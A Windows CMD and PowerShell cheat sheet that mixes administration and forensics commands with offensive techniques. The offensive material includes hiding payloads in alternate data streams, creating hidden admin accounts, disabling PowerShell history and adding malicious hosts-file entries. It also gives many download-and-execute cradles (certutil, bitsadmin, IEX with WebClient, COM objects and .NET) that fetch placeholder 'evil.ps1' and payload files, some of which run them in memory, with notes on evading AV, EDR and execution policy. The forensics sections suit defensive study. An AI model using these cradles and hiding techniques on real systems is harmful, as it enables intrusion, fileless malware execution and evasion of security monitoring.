
> [!abstract] Windows CMD & PowerShell Cheat Sheet
> A comprehensive guide for Windows administration, enumeration, persistence, and forensics using both Command Prompt (CMD) and PowerShell.

## Execution & History

> [!info]+ Runas & PowerShell History
> ```cmd
> # Run process as another user
> runas /user:administrator cmd
> ```
> ```powershell
> # PowerShell History Management
> Get-History
> Clear-History # Note: Does not clear the file completely
> 
> # Find and read the history file path
> Get-PSReadLineOption | Select HistorySavePath
> type <path_from_above>
> 
> # Stop saving history
> Set-PSReadLineOption -HistorySaveStyle SaveNothing
> $profile | select *
> ```

---

## Network & Host Configuration

> [!tip]+ Modify Hosts File
> Add malicious entries to redirect traffic.
> ```powershell
> Add-Content -Path C:\windows\system32\drivers\etc\hosts -Value "10.10.75.1 www1-googleanalytics.com"
> ```

> [!example]+ Port & Service Scanning
> Find active connections and scan internal ports.
> ```cmd
> netstat -an # Active and listening ports
> netstat -ab # Active ports and executable binary
> ```
> ```powershell
> # Network Connections
> Get-NetTCPConnection
> Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess
> Get-NetTCPConnection -RemoteAddress 10.10.75.1 | Select-Object CreationTime, LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess, State
> 
> # Port Scanner Script
> foreach ($port in 1..1024) {If (($a=Test-NetConnection 172.20.10.1 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open!"}}
> ```

---

## SMB Enumeration & Management

> [!bug]+ CMD & PowerShell SMB Commands
> Enumerate shares, map drives, and manage sessions.
> 
> **CMD:**
> ```cmd
> net share  # Show shared folders
> net use    # Show mapped drives
> net share * /delete
> net use * /delete
> net share hi=C:\Users\Administrator\Desktop
> net use z: \\localip\hi password /user:administrator
> net use \\TargetIP\ipc$ "" /u:""  # Null session
> net view    # Show computers
> net view \\172.20.10.1 /ALL 
> nbtstat -A x.x.x.x
> nbtstat -c
> ```
> 
> **PowerShell:**
> ```powershell
> Get-SmbShare
> Get-SmbSession
> Get-SmbSession | Select-Object ClientComputerName, Dialect, SecondsExists, SecondsIdle
> Get-CimInstance -Class win32_share -ComputerName 172.20.10.1
> 
> # Close session and change user password
> $Password = Read-Host -AsSecureString
> Set-LocalUser -Name scezar -Password $Password
> Close-SmbSession -ClientComputerName 10.10.75.1 -Force
> ```
## Process Management

> [!info]+ Process Information
> Monitor and terminate processes. 
> ```powershell
> Get-Process
> Stop-Process
> Get-Process | Select-Object -Property Path, Name, Id
> Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Name -eq explorer
> Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Path -Like "*temp*"
> Get-Process lsass | Select-Object -Property *
> Get-Process -Id <processid>
> Get-process 'powersh*' | Select-object * # Detailed
> Get-Process -Computername 172.20.10.1 # Remote
> Get-Process dynamics | Stop-Process
> ```

> [!tip]+ CIM (Common Information Model)
> CIM gives us more detailed process info, including command lines.
> ```powershell
> # List processes with command lines
> Get-CimInstance -Class Win32_Process | Select-Object ProcessId, ProcessName, CommandLine
> 
> # Find child processes of LSASS (ParentProcessId)
> $lsass_pid = (Get-Process 'lsass').Id
> Get-CimInstance -Class Win32_Process | Where-Object -Property ParentProcessId -EQ $lsass_pid
> ```

---

## System Info, Services & Users

> [!example]+ System & Services
> ```cmd
> # Sysinternals tools
> psgetsid
> psloggedon
> 
> # Service management
> net stop wampapache
> net start wampapache
> sc delete dynamics
> ```
> ```powershell
> Get-Service
> Get-Service IIS
> Stop-Service -Name Dynamics
> Start-Service nameservice
> Restart-Service nameservice
> 
> # Service Permissions
> icacls "C:\Users\bin\xamps"
> Get-ACL
> 
> # Detailed Service Info
> Get-CimInstance -ClassName Win32_Service | Format-List Name,Caption,Description,PathName
> Get-CimInstance -ClassName Win32_Service | Select Name,State,PathName | Where-Object {$_.State -Like 'Running'}
> 
> # Compare Services (Baseline vs Current)
> $old = Get-Content .\baseline-services-20220325.txt
> $current = Get-Content .\services-liveinvestigation.txt
> Compare-Object -ReferenceObject $old -DifferenceObject $current
> ```

> [!warning]+ User & Group Management
> **MITRE ATT&CK:** [T1136 Create Account](https://attack.mitre.org/techniques/T1136/)
> 
> ```cmd
> net users   # Show local users
> net user adolf
> net users /domain  # Show domain users
> whoami /groups
> whoami /priv
> net localgroup administrators
> net user /add <user> <password>
> net user <user> /active:yes
> net localgroup administrators <user> /add
> ```
> ```powershell
> Get-LocalUser
> Get-LocalUser | Where-Object Enabled -eq $True
> Get-LocalGroup
> Get-LocalGroupMember Administrators
> ```

## File Operations & Steganography

> [!danger]+ Hidden Files & Alternate Data Streams (ADS)
> Hide payloads inside legitimate files using ADS.
> ```cmd
> # Standard hidden file
> attrib +s +h +r file.txt
> dir -r # Show hidden context
> 
> # ADS Injection
> type payload.exe > syslog.txt:mal.exe
> del payload.exe
> start syslog.txt:mal.exe # This will error, need symlink
> 
> # Create symlink to execute ADS payload
> mklink C:\Windows\System32\hi.exe C:\temp\syslog.txt:mal.exe
> ```

> [!example]+ Find Files & Hashes
> Search for specific files and generate hashes.
> ```powershell
> # Find specific files
> Get-ChildItem -Path 'C:\' -Include '*.kdbx' -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users\adolf -Include *.xls,*.xlsx,*.pdf,*.txt,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
> 
> # Hashing & Strings
> Get-FileHash file -Algorithm SHA1
> Get-Content .\services.txt -First 10
> ```

> [!info] Decode Encoded PowerShell
> Attackers often use Base64 encoded commands.
> ```powershell
> powershell -EncodedCommand <base64_string> # or -e
> ```
> *Decode online at:* [CyberChef](https://gchq.github.io/CyberChef)

---
## Download Files with script

> [!tip]+ Downloading Files to the Filesystem
> These methods save the file directly to the hard drive. Easier to use, but more likely to be caught by AV.
> 
> **Certutil (CMD):**
> ```cmd
> certutil -urlcache -f http://192.158.23.1/payload.exe payload.exe
> ```
> 
> **Bitsadmin (Bypass IDS/IPS - Slow but stealthy):**
> ```cmd
> bitsadmin /transfer exploit.exe http://1p/exploit.exe C:\service.exe
> ```
> 
> **Invoke-WebRequest (PowerShell):**
> ```powershell
> iwr -uri http://172.20.10.1/file.exe -Outfile winPEAS.exe
> ```
> 
> **Start-BitsTransfer (PowerShell version of Bitsadmin):**
> ```powershell
> Start-BitsTransfer -Source "http://172.20.10.1/file.exe" -Destination "C:\Windows\Temp\file.exe"
> ```
#### In-Memory Execution (Fileless)

> [!danger]+ Downloading & Executing Scripts in Memory
> Using `IEX` (Invoke-Expression) allows scripts to be downloaded and executed directly in RAM without touching the disk.
> 
> **Method 1: Net.WebClient (DownloadString)**
> ```powershell
> IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
> ```
> **Method 2: Invoke-WebRequest (iwr)**
> ```powershell
> IEX (iwr 'http://x.x.x.x/s.ps1')
> # Or explicitly:
> IEX (Invoke-WebRequest -Uri 'http://x.x.x.x/s.ps1' -UseBasicParsing).Content
> ```

> [!bug]+ Using COM Objects for Stealthy Downloads
> Component Object Model (COM) objects can be used to bypass PowerShell execution policies and certain application whitelisting solutions.
> 
> **Method 1: InternetExplorer.Application (CLSID)**
> *Note: Requires Internet Explorer engine to be available.*
> ```powershell
> $ie = New-Object -ComObject InternetExplorer.Application
> $ie.Visible = $False
> $ie.navigate('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
> sleep 5
> $response = $ie.Document.body.innerHTML
> $ie.quit()
> IEX $response
> ```
> 
> **Method 2: Msxml2.XMLHTTP**
> *Reads the context of a web page via XMLHTTP requests.*
> ```powershell
> $h = New-Object -ComObject Msxml2.XMLHTTP
> $h.open('GET','http://x.x.x.x/evil.ps1',$false)
> $h.send()
> IEX $h.ResponseText
> ```
> 
> **Method 3: WinHttp.WinHttpRequest.5.1 (Added)**
> *Often used when Msxml2 is monitored by EDR.*
> ```powershell
> $w = New-Object -ComObject WinHttp.WinHttpRequest.5.1
> $w.Open('GET','http://x.x.x.x/evil.ps1',$false)
> $w.Send()
> IEX $w.ResponseText
> ```

> [!example]+ Using .NET Framework for Downloads
> If Constrained Language Mode (CLM) or Proxies block standard Cmdlets like `iwr`, .NET classes can be invoked directly.
> 
> **Method 1: System.Net.WebRequest**
> ```powershell
> $wr = [System.NET.WebRequest]::Create("http://x.x.x.x/evil.ps1")
> $r = $wr.GetResponse()
> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
> ```
> 
> **Method 2: System.Net.WebClient (DownloadFile - Added)**
> *Saves a file to disk using .NET.*
> ```powershell
> (New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/file.exe','C:\Users\Public\file.exe')
> ```
> 
> **Method 3: System.Net.WebClient (DownloadData - Added)**
> *Downloads file as a byte array (useful for invoking .NET assemblies in memory).*
> ```powershell
> $bytes = (New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/payload.exe')
> # Example execution in memory:
> [Reflection.Assembly]::Load($bytes) | Out-Null
> [Program]::Main()
> ```
## Registry & Persistence

> [!abstract]+ Registry Navigation
> The Windows Registry is structured like a file system. Top-level keys are drives, nested keys are folders.
> - `Get-ChildItem` (alias: `dir`)
> - `Set-Location` (alias: `cd`)
> 
> ```powershell
> # List installed software (32-bit & 64-bit)
> Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'| Select displayname
> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'| Select displayname
> 
> # Persistence check (Run keys)
> Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
> Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
> 
> # Remove persistence
> Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Calcache"
> ```

> [!warning]+ Scheduled Tasks
> Attackers use scheduled tasks for persistence (e.g., trigger script on logon failure).
> ```cmd
> schtasks /query /fo LIST /v
> ```
> ```powershell
> Get-ScheduledTask
> Get-ScheduledTask *Avast* | Select-Object TaskName
> Export-ScheduledTask -TaskName 'AvastUpdatre'
> Get-ScheduledTaskInfo -TaskName 'AvastUpdatre' | Select-Object LastRunTime
> Unregister-ScheduledTask -TaskName "Microsoft eDynamics"
> ```

---

## Windows Forensics & Event Logs

> [!info]+ Windows Event Viewer
> Monitor for unauthorized access and process creation.
> 
> **Important Event IDs:**
> - `4624`: An account was successfully logged on
> - `4634`: An account was logged off
> - `4672`: Special privileges assigned to new logon
> - `4732`: A member was added to a security-enabled local group
> - `4648`: A logon was attempted using explicit credentials
> - `4688`: A new process has been created
> - `4697`: A service was installed in the system
> - `4768`: A Kerberos authentication ticket (TGT) was requested
> 
> ```powershell
> $start = Get-Date 3/1/2022
> $end = Get-Date 3/31/2022
> Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start; EndTime=$end}
> 
> # Find hidden services installed
> Get-WinEvent -FilterHashtable @{ LogName='System'; Id='7045'}
> ```

> [!danger]+ Memory Investigation (Volatility)
> Capture and analyze RAM to find malicious processes.
> 
> **Step 1: Capture Memory (WinPmem)**
> ```powershell
> .\winpmem_mini.exe .\win10.0.22000.556.raw
> ```
> 
> **Step 2: Analyze with Volatility3**
> ```bash
> vol -q -f win10.0.22000.556.raw windows.pslist.PsList
> vol -q -f win10.0.22000.556.raw windows.pstree.PsTree
> vol -q -f win10.0.22000.556.raw windows.netscan.NetScan
> vol -q -f win10.0.22000.556.raw windows.cmdline.CmdLine
> vol -f win10.0.22000.556.raw windows.dlllist.DllList -h # Help
> ```
